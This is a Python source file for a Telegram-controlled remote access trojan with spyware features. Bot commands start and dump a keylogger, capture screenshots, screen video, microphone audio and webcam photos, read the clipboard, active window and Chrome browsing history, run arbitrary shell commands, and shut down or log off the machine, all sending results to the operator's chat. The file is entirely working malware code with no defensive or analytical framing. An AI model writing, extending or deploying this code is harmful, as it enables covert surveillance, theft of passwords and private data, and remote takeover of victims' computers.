import cv2
import mss
import numpy as np
import tempfile
import os
from time import time, sleep
from telebot.types import Message
from bot_core.config import BOT_ADMIN_ID
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import pygetwindow as gw
from pynput import keyboard
import threading
import pyperclip
import subprocess
from browser_history.browsers import Chrome
history = Chrome().fetch_history()



def attach_surveillance_handlers(bot):
    # Keylogger globals
    global keylog_data, keylog_running, keylog_listener
    keylog_data = ""
    keylog_running = False
    keylog_listener = None  # Global listener reference

    def on_press(key):
        global keylog_data, keylog_running
        if not keylog_running:
            return
        try:
            keylog_data += key.char
        except AttributeError:
            keylog_data += f" [{key.name}] "

    def start_keylogger():
        global keylog_running, keylog_listener
        if keylog_running:
            return  # Already running
        keylog_running = True
        keylog_listener = keyboard.Listener(on_press=on_press)
        keylog_listener.start()

    def stop_keylogger():
        global keylog_running, keylog_listener
        keylog_running = False
        if keylog_listener:
            keylog_listener.stop()
            keylog_listener = None

    @bot.message_handler(commands=['keylog_start'])
    def handle_keylog_start(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        start_keylogger()
        bot.reply_to(message, "🟢 Keylogger started.")

    @bot.message_handler(commands=['keylog_dump'])
    def handle_keylog_dump(message: Message):
        global keylog_data
        if message.from_user.id != BOT_ADMIN_ID:
            return
        bot.send_message(message.chat.id, f"📝 Keylog dump:\n{keylog_data or 'No keystrokes captured yet.'}")
        keylog_data = ""  # ✅ Clear after dump

    @bot.message_handler(commands=['keylog_stop'])
    def handle_keylog_stop(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        stop_keylogger()
        bot.reply_to(message, "🔴 Keylogger stopped.")

    @bot.message_handler(commands=['screenshot'])
    def handle_screenshot(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        try:
            screenshot = pyautogui.screenshot()
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
                screenshot.save(tmpfile.name)
                tmpfile_path = tmpfile.name

            with open(tmpfile_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption="📸 Screenshot captured.")
            os.remove(tmpfile_path)
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['recordscreen'])
    def handle_record_screen(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return

        try:
            duration = int(message.text.split(' ')[1])
        except:
            duration = 10  # default

        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.reply_to(message, f"🎥 Recording screen for {duration} seconds at 720p 15fps...")

        try:
            fps = 15
            codec = cv2.VideoWriter_fourcc(*'mp4v')
            width, height = 1280, 720

            temp_video = tempfile.NamedTemporaryFile(delete=False, suffix='.mp4')
            video_path = temp_video.name
            temp_video.close()

            out = cv2.VideoWriter(video_path, codec, fps, (width, height))

            with mss.mss() as sct:
                monitor = sct.monitors[1]  # Primary monitor
                start_time = time()
            
                frames_to_capture = duration * fps
                for _ in range(frames_to_capture):
                    frame = np.array(sct.grab(monitor))
                    frame = cv2.resize(frame, (width, height))
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    out.write(frame)
                    sleep(1 / fps)

            out.release()

            with open(video_path, 'rb') as vid:
                bot.send_document(message.chat.id, vid, caption=f"📁 Real screen recording ({duration}s) 720p@15fps")

            os.remove(video_path)

        except Exception as e:
            bot.reply_to(message, f"❌ Failed to record screen: {e}")


    @bot.message_handler(commands=['recordmic'])
    def handle_record_mic(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return

        try:
            duration = int(message.text.split(' ')[1])
        except:
            duration = 5  # default

        bot.reply_to(message, f"🎙️ Recording microphone for {duration} seconds...")

        try:
            fs = 44100  # Sample rate
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()

            with tempfile.NamedTemporaryFile(delete=False, suffix=".wav") as tmpfile:
                write(tmpfile.name, fs, recording)
                tmpfile_path = tmpfile.name

            with open(tmpfile_path, 'rb') as audio:
                bot.send_audio(message.chat.id, audio, caption=f"🎧 Mic recording ({duration}s) complete.")

            os.remove(tmpfile_path)

        except Exception as e:
            bot.reply_to(message, f"❌ Failed to record mic: {e}")
        
    @bot.message_handler(commands=['camera'])
    def handle_camera_snap(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        
        try:
            bot.send_chat_action(message.chat.id, 'upload_photo')
            cam = cv2.VideoCapture(0)

            # Warm-up delay
            for i in range(20):  # Capture 20 dummy frames to allow auto exposure to adjust
                ret, frame = cam.read()

            ret, frame = cam.read()
            cam.release()

            if not ret:
                bot.reply_to(message, "❌ Failed to capture photo.")
                return
            frame = cv2.convertScaleAbs(frame, alpha=1.4, beta=50)  # try alpha: 1.4–1.6, beta: 40–60
            # Save to temp file
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmpfile:
                photo_path = tmpfile.name
                cv2.imwrite(photo_path, frame)

            # Send photo
            with open(photo_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption="📸 Camera snapshot.")

            os.remove(photo_path)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")    
    
    @bot.message_handler(commands=['activewindow'])
    def handle_active_window(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
           return
        try:
            active = gw.getActiveWindow()
            title = active.title if active else "No active window detected."
            bot.reply_to(message, f"\U0001fa9f Active window:\n`{title}`", parse_mode="Markdown")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['clipboard'])
    def handle_clipboard(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        try:
            content = pyperclip.paste()
            if content:
                bot.send_message(message.chat.id, f"\U0001f9e0 Clipboard Content:\n```\n{content}\n```", parse_mode='Markdown')
            else:
                bot.send_message(message.chat.id, "\U0001f4cb Clipboard is empty.")
        except Exception as e:
            bot.reply_to(message, f"❌ Failed to read clipboard: {e}")

    @bot.message_handler(commands=['browser_history'])
    def handle_browser_history(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        try:
            from browser_history.browsers import Chrome
            outputs = Chrome().fetch_history()
            hist = outputs.histories  # list of (datetime, url, title)

            if not hist:
                bot.reply_to(message, "🕸️ No browser history found.")
                return

            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode='w', encoding='utf-8') as temp_file:
                for time, url, title in hist[-100:]:
                    temp_file.write(f"{time} - {url} - {title}\n")
                temp_file_path = temp_file.name

            with open(temp_file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption="🕸️ Last 100 browser history entries.")

            threading.Timer(5.0, lambda: os.remove(temp_file_path)).start()

        except Exception as e:
            bot.reply_to(message, f"❌ Failed to fetch browser history: {e}")

    @bot.message_handler(commands=['run'])
    def handle_run_command(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        try:
            cmd = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, "❗ Please provide a command to run.\nUsage: `/run <command>`", parse_mode='Markdown')
            return
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
            if not result.strip():
                result = "✅ Command executed successfully. (No output)"
        except subprocess.CalledProcessError as e:
            result = f"❌ Error:\n{e.output}"
        except Exception as e:
            result = f"❌ Exception:\n{str(e)}"
        # If output is too large, send as file
        if len(result) > 4000:
            with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8', suffix=".txt") as temp_file:
                temp_file.write(result)
                temp_file_path = temp_file.name
            with open(temp_file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📄 Output too long. Sent as file.")
            threading.Timer(5.0, lambda: os.remove(temp_file_path)).start()
        else:
            bot.reply_to(message, f"📤 Output:\n`{result}`", parse_mode='Markdown')

    @bot.message_handler(commands=['shutdown'])
    def handle_shutdown(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        bot.reply_to(message, "🛑 Shutting down system in 5 seconds...")
        threading.Timer(5.0, lambda: os.system("shutdown /s /t 0")).start()

    @bot.message_handler(commands=['restart'])
    def handle_restart(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        bot.reply_to(message, "🔁 Restarting system in 5 seconds...")
        threading.Timer(5.0, lambda: os.system("shutdown /r /t 0")).start()

    @bot.message_handler(commands=['logoff'])
    def handle_logoff(message: Message):
        if message.from_user.id != BOT_ADMIN_ID:
            return
        bot.reply_to(message, "🚪 Logging off current user in 5 seconds...")
        threading.Timer(5.0, lambda: os.system("shutdown /l")).start()